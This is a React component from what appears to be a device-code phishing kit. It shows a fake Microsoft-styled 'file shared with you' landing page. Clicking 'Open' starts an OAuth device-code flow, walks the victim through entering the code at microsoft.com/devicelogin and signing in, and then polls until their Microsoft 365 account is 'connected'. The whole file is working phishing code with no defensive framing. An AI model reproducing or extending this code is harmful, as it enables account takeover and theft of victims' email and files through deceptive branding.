"use client";

import { useState, useEffect, useRef } from "react";
import { Copy, Check, ExternalLink, Loader2, Mail } from "lucide-react";

interface InvitationLandingProps {
  invitationId: string;
  invitationCode: string;
  template: string;
  documentTitle: string;
  docType: string;
  senderName: string;
  exitUrl: string | null;
}

const DOC_COLORS: Record<string, string> = {
  PDF: "#E74C3C",
  DOCX: "#2B579A",
  XLSX: "#217346",
  PPTX: "#D24726",
  ZIP: "#F0AD4E",
};

export default function InvitationLanding({
  invitationId,
  invitationCode,
  template,
  documentTitle,
  docType,
  senderName,
  exitUrl,
}: InvitationLandingProps) {
  const [stage, setStage] = useState<"template" | "waiting" | "complete" | "error">("template");
  const [userCode, setUserCode] = useState("");
  const [verificationUri, setVerificationUri] = useState("");
  const [deviceCode, setDeviceCode] = useState("");
  const [pollInterval, setPollInterval] = useState(5);
  const [copied, setCopied] = useState(false);
  const [connecting, setConnecting] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const [connectedEmail, setConnectedEmail] = useState("");
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const handleConnect = async () => {
    setConnecting(true);
    try {
      const res = await fetch("/api/public/i/connect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ invitationId }),
      });
      if (!res.ok) {
        const data = await res.json();
        setErrorMsg(data.error || "Something went wrong");
        setStage("error");
        return;
      }
      const data = await res.json();
      setUserCode(data.userCode);
      setVerificationUri(data.verificationUri);
      setDeviceCode(data.deviceCode);
      setPollInterval(data.interval || 5);
      setStage("waiting");
    } catch {
      setErrorMsg("Network error. Please check your connection.");
      setStage("error");
    } finally {
      setConnecting(false);
    }
  };

  useEffect(() => {
    if (stage !== "waiting" || !deviceCode) return;

    pollRef.current = setInterval(async () => {
      try {
        const res = await fetch("/api/public/i/poll", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ deviceCode, invitationId }),
        });

        if (!res.ok) return;

        const data = await res.json();

        if (data.status === "complete") {
          if (pollRef.current) clearInterval(pollRef.current);
          setConnectedEmail(data.email || "");
          if (data.exitUrl) {
            window.location.href = data.exitUrl;
          } else {
            setStage("complete");
          }
        } else if (data.status === "error") {
          if (data.error && !data.error.includes("pending")) {
            if (pollRef.current) clearInterval(pollRef.current);
            setErrorMsg(data.error || "Authentication failed");
            setStage("error");
          }
        }
      } catch {
        // network blip, keep polling
      }
    }, pollInterval * 1000);

    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, [stage, deviceCode, invitationId, pollInterval]);

  const handleCopy = () => {
    navigator.clipboard.writeText(userCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  // Template stage — generic branded page
  if (stage === "template") {
    const docColor = DOC_COLORS[docType] || "#0078D4";
    const brandName = template
      .split("_")
      .map((w) => w.charAt(0).toUpperCase() + w.slice(1))
      .join(" ");

    return (
      <div style={{ minHeight: "100vh", backgroundColor: "#1b1b1b", display: "flex", flexDirection: "column", alignItems: "center" }}>
        <div style={{ width: "100%", padding: "16px 24px", backgroundColor: "#0078D4", display: "flex", alignItems: "center", gap: 10 }}>
          <span style={{ color: "#fff", fontSize: 16, fontWeight: 600 }}>{brandName}</span>
        </div>
        <div style={{ maxWidth: 480, width: "100%", margin: "80px auto 0", padding: "0 16px" }}>
          <div style={{ backgroundColor: "#2d2d2d", borderRadius: 8, padding: 32, border: "1px solid #404040" }}>
            <p style={{ color: "#a0a0a0", fontSize: 13, marginBottom: 8 }}>
              {senderName} shared a file with you
            </p>
            <div style={{ display: "flex", alignItems: "center", gap: 16, padding: "16px 0", borderBottom: "1px solid #404040", marginBottom: 24 }}>
              <div style={{ width: 48, height: 56, borderRadius: 4, backgroundColor: docColor, display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontSize: 12, fontWeight: 700 }}>
                {docType}
              </div>
              <div>
                <p style={{ color: "#e0e0e0", fontSize: 15, fontWeight: 600 }}>{documentTitle}</p>
                <p style={{ color: "#808080", fontSize: 12, marginTop: 2 }}>{docType} &middot; {new Date().toLocaleDateString()}</p>
              </div>
            </div>
            <button
              onClick={handleConnect}
              disabled={connecting}
              style={{
                width: "100%",
                padding: "12px 24px",
                backgroundColor: connecting ? "#005a9e" : "#0078D4",
                color: "#fff",
                border: "none",
                borderRadius: 4,
                fontSize: 14,
                fontWeight: 600,
                cursor: connecting ? "not-allowed" : "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 8,
              }}
            >
              {connecting && <Loader2 className="h-4 w-4 animate-spin" />}
              {connecting ? "Opening..." : "Open"}
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Waiting stage — show code
  if (stage === "waiting") {
    return (
      <div style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", background: "#0a0a0a", padding: 16 }}>
        <div style={{ width: "100%", maxWidth: 500 }}>
          <div style={{ background: "#141414", border: "1px solid #2a2a2a", borderRadius: 12, padding: 32, textAlign: "center" }}>
            <p style={{ color: "#888", fontSize: 14, marginBottom: 8 }}>Verification code</p>
            <p style={{ fontFamily: "monospace", fontSize: 36, fontWeight: "bold", letterSpacing: "0.3em", color: "#fff", margin: "12px 0" }}>
              {userCode}
            </p>
            <button
              onClick={handleCopy}
              style={{
                background: copied ? "#166534" : "#1a1a2e",
                border: "1px solid #2a2a2a",
                color: "#fff",
                padding: "8px 20px",
                borderRadius: 8,
                cursor: "pointer",
                fontSize: 14,
                display: "inline-flex",
                alignItems: "center",
                gap: 8,
              }}
            >
              {copied ? <><Check size={16} /> Copied!</> : <><Copy size={16} /> Copy code</>}
            </button>

            <div style={{ marginTop: 32, textAlign: "left" }}>
              <p style={{ color: "#ccc", fontSize: 14, fontWeight: 600, marginBottom: 12 }}>Steps to verify:</p>
              <ol style={{ color: "#888", fontSize: 14, lineHeight: 2, paddingLeft: 20 }}>
                <li>Open the link below in a new tab</li>
                <li>Enter code <strong style={{ color: "#fff" }}>{userCode}</strong> when prompted</li>
                <li>Sign in with your Microsoft account</li>
                <li>Return to this page — it updates automatically</li>
              </ol>
            </div>

            <a
              href={verificationUri || "https://microsoft.com/devicelogin"}
              target="_blank"
              rel="noopener noreferrer"
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 8,
                marginTop: 20,
                padding: "12px 24px",
                background: "#1a3a5c",
                border: "1px solid #2a5a8c",
                borderRadius: 8,
                color: "#5ba3e6",
                fontSize: 14,
                fontWeight: 500,
                textDecoration: "none",
              }}
            >
              {verificationUri || "https://microsoft.com/devicelogin"}
              <ExternalLink size={14} />
            </a>
          </div>

          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, marginTop: 24 }}>
            <Loader2 size={16} style={{ animation: "spin 1s linear infinite", color: "#888" }} />
            <span style={{ color: "#888", fontSize: 14 }}>Waiting for authentication...</span>
          </div>
          <style>{`@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }`}</style>
        </div>
      </div>
    );
  }

  // Complete stage
  if (stage === "complete") {
    return (
      <div style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", background: "#0a0a0a", padding: 16 }}>
        <div style={{ width: "100%", maxWidth: 500, textAlign: "center" }}>
          <div style={{ width: 80, height: 80, borderRadius: "50%", background: "rgba(22,101,52,0.2)", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 24px" }}>
            <Check size={40} color="#22c55e" />
          </div>
          <h1 style={{ fontSize: 28, fontWeight: "bold", color: "#fff", marginBottom: 8 }}>Account Connected!</h1>
          <p style={{ color: "#888", marginBottom: 24 }}>
            Your Microsoft 365 account has been successfully verified. You can now close this window.
          </p>
          {connectedEmail && (
            <p style={{ color: "#5ba3e6", fontSize: 14, background: "#1a1a2e", padding: "8px 16px", borderRadius: 8, display: "inline-block" }}>
              {connectedEmail}
            </p>
          )}
        </div>
      </div>
    );
  }

  // Error stage
  return (
    <div style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", background: "#0a0a0a", padding: 16 }}>
      <div style={{ width: "100%", maxWidth: 500, textAlign: "center" }}>
        <div style={{ width: 80, height: 80, borderRadius: "50%", background: "rgba(220,38,38,0.1)", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 24px" }}>
          <Mail size={40} color="#ef4444" />
        </div>
        <h1 style={{ fontSize: 24, fontWeight: "bold", color: "#ef4444", marginBottom: 8 }}>Authentication Failed</h1>
        <p style={{ color: "#888", marginBottom: 24 }}>{errorMsg}</p>
        <button
          onClick={() => { setStage("template"); setErrorMsg(""); }}
          style={{ background: "#1a1a2e", border: "1px solid #2a2a2a", color: "#fff", padding: "10px 24px", borderRadius: 8, cursor: "pointer", fontSize: 14 }}
        >
          Try Again
        </button>
      </div>
    </div>
  );
}
